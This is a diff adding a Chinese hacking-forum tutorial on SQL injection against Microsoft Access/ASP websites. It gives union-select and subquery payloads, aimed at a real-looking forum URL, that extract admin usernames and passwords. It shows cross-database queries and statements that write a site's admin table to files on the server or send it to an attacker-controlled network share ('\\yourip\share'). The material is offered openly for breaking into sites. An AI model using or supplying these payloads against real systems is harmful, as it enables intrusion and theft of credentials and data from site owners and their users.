@@ -1,0 +1,60 @@
+--------------------------------------------------------------
+union查询法
+首先要说的就是查询办法,一般的查询办法就是
+
+程序代码
+and 1=(select count(*) from admin where left(id,1)='1')
+
+这样开始判断了...就算你使用各种各样的工具,也是一个个字的去猜去判断对不对,不对再换一个.这样的坏处显而易见,慢. 特别是在猜测经过32位MD5加密过的段的时候...基本上你可以去泡壶茶再喝一杯.
+所以这个时候,union select横空出现.别以为只能在PHP里用哦...
+譬如你有一个ACCESS点:
+程序代码
+http://bbs.tian6.com/xiaoyang.asp?coder=1
+
+知道存在admin表(你当然可以拿个工具先快速猜出表和字段来),
+然后我们直接来:
+程序代码
+http://bbs.tian6.com/xiaoyang.asp?coder=1 union select 1,2,3,4,5,6..... from admin [where coderx=1(如果有限制查询条件)]
+
+这里从1开始加到回显正常为止.然后替换URL里相应在页面出现的1~X为password,username之类的东西,就可以直接暴内容了.多方便,多快捷.茶可以先放放,凉一些再来喝了.
+
+
+
+---------------------------------------------------------------
+Access跨库查询
+有时候某个网站服务器上有两个以上系统,你发现其中一个有ACCESS注入点,但是后台没法提权,另外一个系统没有注入点,但是后台却有你需要的功能.那么这个时候,跨库来了.当然,你还可以用来MDB溢出,渗透的过程等等.他的作用往往是意想不到的.
+跨库的查询语句:
+子查询:
+程序代码
+and (Select Count(*) from [D:\tianyang\backdoor\xiaoyang.mdb].test)>0
+
+union查询:
+程序代码
+union select 1,2,3,4.... from admin in "D:\xioatianyang\okok.asa" where id=1
+
+跨库的作用当然不只这些了,大伙继续发挥吧..这里提供两篇参考过的文章连接:
+程序代码
+http://www.4ngel.net/article/46.htm 
+http://hf110.com/Article/hack/rqsl/200502/66.html
+
+---------------------------------------------------------------
+Access注入,导出txt,htm,html
+子查询语句:
+程序代码
+Select * into [test.txt] in 'd:\web\' 'text;' from admin
+
+这样就把admin表的内容以test类型存进了d:\web里面.
+UNION查询:
+程序代码
+union select * into [admin.txt] in 'c:\' 'test;' from admin
+
+而且这里也可以保存到本地来:
+程序代码
+Select * into [test.txt] in '\\yourip\share' 'text;' from admin
+
+不过,很多人包括我自己测试,本机数据库来操作是没问题的,但是一旦在注入点上,子查询会回显没有权限,union会回显动作查询不能作为行的来源.可以说还是个难题...原因大概是UNION只适用查询结合,UNION后面不能跟动作.和这个内容相关的,本论坛已有一帖:
+
+程序代码
+http://bbs.tian6.com/viewthread.php?tid=3016&extra=page%3D7
+
+因为网上有许多和这相关的资料,所以我还是把他引进来了.如果一旦这方法运用成功的话,理论上我们只要知道表名,不需要知道段名,就可以看到该表所有内容了.或者我们可以建.php.tianyang  asp.asp之类的文件或者目录来导进文件~还是会很强大的.
